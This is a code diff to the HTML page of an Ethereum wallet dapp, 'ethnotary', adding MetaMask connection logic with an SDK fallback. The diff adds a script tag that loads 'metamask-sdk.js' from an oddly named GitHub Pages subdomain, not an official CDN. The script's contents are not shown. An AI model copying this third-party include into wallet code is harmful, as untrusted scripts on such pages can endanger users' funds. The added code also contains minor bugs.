@@ -31,17 +31,62 @@
 	<script src="https://cdn.jsdelivr.net/npm/web3@4.2.2/dist/web3.min.js"></script>
 	<script src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
 	<script src="https://unpkg.com/@walletconnect/client@latest/dist/umd/index.min.js"></script>
+	<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+
 
 
 
 	<script src="assets/js/bundle.js"></script>
 </head>
+
+
+
 <script type="text/javascript">
 	// Ensure ethers is available in the global scope
 	const ethers = window.ethers;
 
 	// Function to connect to the user's Ethereum wallet
 	async function connectMetaMask() {
+		if (typeof window.ethereum !== 'undefined') {
+
+			if (window.ethereum.isMetaMask == true) {
+				try {
+
+					connectBrowserWallet();
+
+				}
+				catch (error) {
+					console.error('There is an issue connecting you MetaMask wallet:', error);
+				}
+
+
+			}
+
+		}
+		else {
+
+
+			const MMSDK = await new MetaMaskSDK.MetaMaskSDK(
+				dappMetadata = {
+					name: "ethnotary",
+					url: "ethnotary.io",
+				}
+				// Other options
+			)
+			// Because init process of the MetaMaskSDK is async.
+			setTimeout(() => {
+				const ethereum = MMSDK.getProvider()
+
+				ethereum.request({ method: 'eth_requestAccounts' })
+			}, 100)
+
+
+
+		}
+	}
+
+	// Function to connect to the user's Ethereum wallet
+	async function connectBrowserWallet() {
 		if (typeof window.ethereum !== 'undefined') {
 			try {
 				// Request account access
